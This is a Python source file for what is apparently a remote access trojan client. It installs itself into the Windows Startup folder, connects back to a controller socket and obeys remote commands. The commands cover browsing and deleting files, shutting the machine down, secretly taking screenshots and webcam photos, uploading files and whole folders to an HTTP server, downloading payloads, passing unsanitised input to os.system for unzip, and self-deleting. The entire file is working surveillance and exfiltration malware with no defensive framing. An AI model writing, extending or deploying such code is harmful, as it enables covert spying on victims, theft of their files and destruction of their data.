import shutil, socket, os, time, subprocess, sys, shutil, pyautogui, requests, cv2
from requests_toolbelt.multipart.encoder import MultipartEncoder
from ast import arg

# --- Constants ---
HOST = "127.0.0.1"
PORT = 9991
FILE_DIR = os.getcwd()
FILE_NAME = os.path.basename(__file__)
SERVER_FILE_URL = "http://localhost:8000/api/file"
SERVER_FOLDER_URL = "http://localhost:8000/api/folder"

# --- Constantiblty ---

pyname = os.path.basename(__file__)
# exename = pyname.replace(".py", ".exe")
os.system(f"copy {pyname} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")

# --- Globals ---
current_dir = os.getcwd()

# --- Order Functions ---
def handle_exit(connection):
    send_response(connection, "Exit")
    return False

def handle_close(connection):
    os.system("shutdown /s /t 3")
    send_response(connection, "Shutting down in 3 seconds")
    return False

def handle_cd(connection, *args):
    try: 
        os.chdir(args[0])
        global current_dir
        current_dir = os.getcwd()
        send_response(connection, f"Changed directory to {args[0]}")
    except Exception as e:
        send_response(connection, f"Error changing directory: {e}")
    return True

def handle_pwd(connection):
    global current_dir
    send_response(connection, f"Current directiory is: {current_dir}")
    return True

def handle_ls(connection):
    files = "\n".join(os.listdir())
    send_response(connection, files)
    return True

def handle_touch(connection, *args):
    try:    
        open(args[0], "w").close()
        send_response(connection, "File created")
    except Exception as e:
        send_response(connection, f"Error: {e}")
    return True

def handle_rm(connection, *args):
    try:
        os.remove(args[0])
        send_response(connection, "File removed")
    except Exception as e:
        send_response(connection, f"Error: {e}")
    return True

def handle_rm_file(connection, *args):
    try:
        shutil.rmtree(args[0])
        send_response(connection, "Folder removed")
    except Exception as e:
        send_response(connection, f"Error: {e}")
    return True

def handle_cat(connection, *args):
    try:
        with open(args[0], "r") as file:
            send_response(connection, file.read())
    except Exception as e:
        send_response(connection, f"Error: {e}")
    return True

def handle_screenshot(connection):
    try:
        time_stamp = time.strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(current_dir, f"screenshot_{time_stamp}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
        with open(screenshot_path, "rb") as file:
            files = {"file": file}
            response = requests.post(SERVER_FILE_URL + "/upload", files=files)
            if response.status_code == 200:
                send_response(connection, "Screenshot uploaded")
                os.remove(screenshot_path)
            else:
                send_response(connection, "Failed to upload screenshot")
        return True

    except Exception as e:
        send_response(connection, f'Error: {e}')
    return True

def handle_download(connection, *args):
    try: 
        id = args[0]
        response = requests.post(SERVER_FILE_URL + f"/download/{id}")
        if response.status_code == 200:
            content_disposition = response.headers.get('Content-Disposition', '')
            filename = "downloaded_file"
            if "filename=" in content_disposition:
                filename = content_disposition.split("filename=")[1].strip('"')
            
            global current_dir
            filepath = os.path.join(current_dir, filename)

            with open(filepath, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)

            send_response(connection, f"File downloaded as {filename}")
        else:
            send_response(connection, f"Failed to download file. Status code: {response.status_code}")
        return True

    except Exception as e:
        send_response(connection, f"Error: {e}")

def handle_upload(connection, *args):
    try:
        file_path = args[0]

        if not os.path.isfile(file_path):
            send_response(connection, f"File not found: {file_path}")
            return True

        with open(file_path, "rb") as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(SERVER_FILE_URL + "/upload", files=files)

        if response.status_code == 200:
            send_response(connection, f"File uploaded successfully: {response.json().get('file_name', 'unknown')}")
        else:
            send_response(connection, f"Upload failed with status {response.status_code}")
        return True

    except Exception as e:
        send_response(connection, f"Error during upload: {e}")
        return True

def handle_download_folder(connection, *args):
    try:
        id = args[0]
        response = requests.get(SERVER_FOLDER_URL + f"/download-folder/{id}")
        if response.status_code == 200:
            content_disposition = response.headers.get('Content-Disposition', '')
            filename = "downloaded_folder"
            if "filename=" in content_disposition:
                filename = content_disposition.split("filename=")[1].strip('"')
            
            global current_dir
            filepath = os.path.join(current_dir, filename)

            with open(filepath, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)

            send_response(connection, f"Folder downloaded as {filename}")
        else:
            send_response(connection, f"Failed to download folder. Status code: {response.status_code}")
        return True

    except Exception as e:
        send_response(connection, f"Error: {e}")
        return True

def create_or_get_folder_id(name, parent_id=None):
    fields = {
        "name": name
    }
    if parent_id:
        fields["parent"] = parent_id

    m = MultipartEncoder(fields=fields)

    response = requests.post(
        SERVER_FOLDER_URL + "/create-folder",
        data=m,
        headers={'Content-Type': m.content_type}
    )

    if response.status_code == 200:
        return response.json()["_id"]
    else:
        raise Exception(f"Folder create failed: {response.text}")

def upload_file_to_folder(file_path, folder_id):
    with open(file_path, 'rb') as f:
        files = {"file": (os.path.basename(file_path), f)}
        upload_url = SERVER_FOLDER_URL + f"/create-file/{folder_id}"
        response = requests.post(upload_url, files=files)
        return response.status_code == 200

def upload_folder_recursive(folder_path, parent_id=None):
    folder_name = os.path.basename(folder_path)
    folder_id = create_or_get_folder_id(folder_name, parent_id)

    for entry in os.listdir(folder_path):
        full_path = os.path.join(folder_path, entry)

        if os.path.isfile(full_path):
            success = upload_file_to_folder(full_path, folder_id)
            if not success:
                send_response(connection, f"Failed to upload file: {full_path}")
            else:
                send_response(connection, f"Uploaded file: {full_path}")

        elif os.path.isdir(full_path):
            upload_folder_recursive(full_path, parent_id=folder_id)

    return folder_id

def handle_upload_folder(connection, *args):
    try:
        if len(args) < 1:
            send_response(connection, "Usage: upload_folder <folder_path>")
            return True

        folder_path = args[0]
        if not os.path.isdir(folder_path):
            send_response(connection, f"Invalid folder path: {folder_path}")
            return True

        root_folder_id = upload_folder_recursive(folder_path)
        send_response(connection, f"Folder uploaded successfully with root ID: {root_folder_id}")
        return True

    except Exception as e:
        send_response(connection, f"Error: {e}")
        return True

def handle_mkdir(connection, *args):
    try:
        os.mkdir(args[0])
        send_response(connection, "Folder created")
    except Exception as e:
        send_response(connection, f"Error: {e}")
    return True

def handle_self_destruction(connection):
    global FILE_DIR
    global FILE_NAME
    
    try:
        os.remove(FILE_DIR + '\\' + FILE_NAME)
        send_response(connection, "File removed")
    except Exception as e:
        send_response(connection, f"Error: {e}")
    return True

def handle_unzip(connection, *args):
    try:
        os.system("unzip " + args[0])
        send_response(connection, "Unzipped")
    except Exception as e:
        send_response(connection, f"Error: {e}")
    return True

def handle_camera(connection):
    try:
        global current_dir

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            send_response(connection, "Camera can't opened")
            return True
    
        ret, frame = cap.read()
        cap.release()
        if not ret:
            send_response(connection, "Failed to read frame")
            return True
    
        photo_path = os.path.join(current_dir, "camera.png")
        cv2.imwrite(photo_path, frame)

        with open(photo_path, "rb") as file:
            files = {"file": file}
            response = requests.post(SERVER_FILE_URL + "/upload", files=files)
            if response.status_code == 200:
                send_response(connection, "Photo uploaded")
                os.remove(photo_path)
            else:
                send_response(connection, "Failed to upload photo")
        return True

    except Exception as e:
        send_response(connection, f'Error: {e}')
    return True

# --- Order Handlers ---
order_handlers = {
    "exit": handle_exit,
    "close": handle_close,
    "cd": handle_cd,
    "pwd": handle_pwd,
    "ls": handle_ls,
    "touch": handle_touch,
    "rm": handle_rm,
    "rm-file": handle_rm_file,
    "mkdir": handle_mkdir,
    "cat": handle_cat,
    "screenshot": handle_screenshot,
    "download": handle_download,
    "upload": handle_upload,
    "upload-folder": handle_upload_folder,
    "download-folder": handle_download_folder,
    "self-destruction": handle_self_destruction,
    "unzip": handle_unzip,
    "camera": handle_camera
}

# --- Helper Functions ---
def receive_command(connection):
    try:
        data = connection.recv(4096)
        if not data:
            return None
        return data.decode().strip()
    except Exception as e:
        return None

def send_response(connection, message):
    connection.send(message.encode())
    return True

# --- Main Function ---
def main():
    try:
        # --- Connection ---
        while True:
            try:
                connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connection.connect((HOST, PORT))
                print("[+] Connected to server")
                break
            except Exception as e:
                print(f"[-] Connection error: {e}")
                time.sleep(5)

        # --- Command Loop ---
        while True:
            order_raw = receive_command(connection)
            if not order_raw:
                continue
            parts = order_raw.split()
            command, args = parts[0], parts[1:]

            handler = order_handlers.get(command)

            if handler:
                should_continue = handler(connection, *args)
                if not should_continue:
                    break
            else:
                send_response(connection, "Invalid command")

    except Exception as e:
        print(f"[!] Error: {e}")
        time.sleep(5)
        subprocess.run([sys.executable, *sys.argv])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Closing server...")
        sys.exit()